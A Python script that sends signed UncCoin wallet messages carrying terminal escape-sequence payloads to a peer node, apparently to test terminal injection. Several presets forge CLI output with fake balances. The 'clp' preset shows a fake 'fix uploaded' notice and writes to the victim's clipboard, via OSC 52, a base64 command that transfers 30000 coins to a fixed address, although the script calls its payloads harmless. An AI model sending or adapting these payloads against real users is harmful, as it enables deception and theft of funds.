import argparse
import asyncio
import json
import uuid
from datetime import datetime
from pathlib import Path
import sys

ROOT_DIR = Path(__file__).resolve().parents[1]
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from wallet.storage import load_wallet


PRESETS = {
    "visible": (
        "Terminal escape PoC: "
        "\x1b[31mred\x1b[0m "
        "\x1b[1mbold\x1b[0m "
        "\x1b[4munderline\x1b[0m"
        "\x1b[2J\n"
        "\x1b/state/wallets/frederik.json"
        "\x1b[=0h"
        "\nhello"
    ),
    "spoof": (
        "\n\x1b[31m[terminal escape PoC]\x1b[0m\n"
        "This text is untrusted message content, but it can look like CLI output.\n"
        "p2p> balance alice\n"
        "Balance for alice: 999999\n"
    ),
    "clear": (
        "\x1b[2J\x1b[H"
        "[terminal escape PoC]\n"
        "The sender cleared/repositioned the terminal before printing this text.\n"
    ),
    "title": (
        "\x1b]0;UncCoin terminal escape PoC\x07"
        "Terminal escape PoC: attempted to change the terminal window title."
    ),
    "overwrite": (
        "\r\x1b[2K"
        "p2p> balance frederik\n"
        "Balance for frederik: 999999\n"
        "p2p> "
    ),
    "hyperlink": (
        "Terminal escape PoC: "
        "\x1b]8;;https://example.com/unccoin-terminal-test\x07"
        "clickable-looking link"
        "\x1b]8;;\x07"
    ),
    "clipboard-safe": (
        "\x1b]52;c;VU5DQ09JTl9URVJNSU5BTF9URVNUX09OTFk=\x07"
        "Terminal escape PoC: attempted to set clipboard to "
        "UNC_COIN_TERMINAL_TEST_ONLY."
    ),
    "query-cursor": (
        "\x1b[6n"
        "Terminal escape PoC: requested terminal cursor position. "
        "Some terminals reply back to the running process."
    ),
    "alt-buffer": (
        "\x1b[?1049h\x1b[2J\x1b[H"
        "Terminal escape PoC: entered the alternate screen buffer.\n"
        "The original terminal contents may be hidden until the buffer is restored.\n"
        "Send preset 'alt-restore' to switch back.\n"
    ),
    "clp": (
        "\x1b[?1049h\x1b[2J\x1b[H"
        "\x1b[1mAn issue was detected in your UncCoin distribution.\x1b[0m\n"
        "A fix has been uploaded to your clipboard. Paste below and press enter to deploy.\n\n"
        "\x1b]52;c;dHggZmUyNjlmNDI3YTVhZDYxOWNlNDgwMTkyZGI1ODNhMjlhN2NlNDA5OGIyMjExMWQ5YjcyMTZlMmZlZTZiYzk2NCAzMDAwMCAw\x07"
    ),
    "pastejack-restart-safe": (
        "\x1b[?1049h\x1b[2J\x1b[H"
        "\x1b[1mUncCoin paste-boundary safety test.\x1b[0m\n"
        "This preset attempts to set your clipboard to a harmless multiline test.\n"
        "If pasted at p2p>, it runs: quit, print a marker, restart frederik:9000.\n\n"
        "\x1b]52;c;cXVpdApwcmludGYgJ1xuVU5DX0NPSU5fUEFTVEVKQUNLX1RFU1RfT05MWTogc2hlbGwgcmVjZWl2ZWQgcGFzdGVkIGxpbmVzIGFmdGVyIG5vZGUgcXVpdC5cbicKLi9zY3JpcHRzL3J1bi5zaCBmcmVkZXJpayA5MDAwCg==\x07"
        "Clipboard payload is intentionally benign and contains no file reads.\n"
    ),
    "alt-restore": (
        "\x1b[?1049l"
        "Terminal escape PoC: requested restore from alternate screen buffer."
    ),
    "cursor-hide": (
        "\x1b[?25l"
        "Terminal escape PoC: requested cursor hide. "
        "Send preset 'cursor-show' to restore it."
    ),
    "cursor-show": (
        "\x1b[?25h"
        "Terminal escape PoC: requested cursor show."
    ),
    "ctrl-c-byte": (
        "Terminal escape PoC: appending raw ETX / Ctrl-C byte next.\n"
        "\x03"
        "eval 2+2"
    ),
}


def create_wallet_message(sender_wallet_name: str, receiver: str, content: str) -> dict:
    wallet = load_wallet(sender_wallet_name)
    timestamp = datetime.now().isoformat()
    message_id = str(uuid.uuid4())
    payload = f"{wallet.address}|{receiver}|{content}|{timestamp}|{message_id}"
    signature = wallet.sign_message(payload)
    return {
        "message_id": message_id,
        "sender": wallet.address,
        "receiver": receiver,
        "content": content,
        "timestamp": timestamp,
        "sender_public_key": {
            "exponent": str(wallet.public_key[0]),
            "modulus": str(wallet.public_key[1]),
        },
        "signature": signature,
    }


async def send_wallet_message(host: str, port: int, wallet_message: dict) -> None:
    reader, writer = await asyncio.open_connection(host, port)
    try:
        # The node sends a handshake immediately on connect. Read it so closing
        # this short-lived test client does not reset a socket with unread data.
        try:
            await asyncio.wait_for(reader.readline(), timeout=1.0)
        except asyncio.TimeoutError:
            pass

        envelope = {
            "type": "wallet_message",
            "message_id": wallet_message["message_id"],
            "message": wallet_message,
        }
        writer.write(json.dumps(envelope).encode("utf-8") + b"\n")
        await writer.drain()
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except ConnectionError:
            pass


def parse_peer(peer: str) -> tuple[str, int]:
    host, port = peer.rsplit(":", maxsplit=1)
    return host, int(port)


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Send a signed UncCoin wallet message containing a harmless terminal "
            "escape-sequence PoC to a node you control."
        )
    )
    parser.add_argument("--peer", required=True, help="Target node host:port.")
    parser.add_argument("--sender-wallet", required=True, help="Local wallet name to sign with.")
    parser.add_argument("--receiver", required=True, help="Target wallet address.")
    parser.add_argument(
        "--preset",
        choices=sorted(PRESETS),
        default="visible",
        help="PoC payload preset. 'clear' intentionally clears/repositions the terminal.",
    )
    args = parser.parse_args()

    host, port = parse_peer(args.peer)
    wallet_message = create_wallet_message(
        sender_wallet_name=args.sender_wallet,
        receiver=args.receiver,
        content=PRESETS[args.preset],
    )
    asyncio.run(send_wallet_message(host, port, wallet_message))
    print(
        "Sent terminal escape PoC message "
        f"{wallet_message['message_id'][:12]} to {host}:{port} "
        f"using preset '{args.preset}'."
    )


if __name__ == "__main__":
    main()
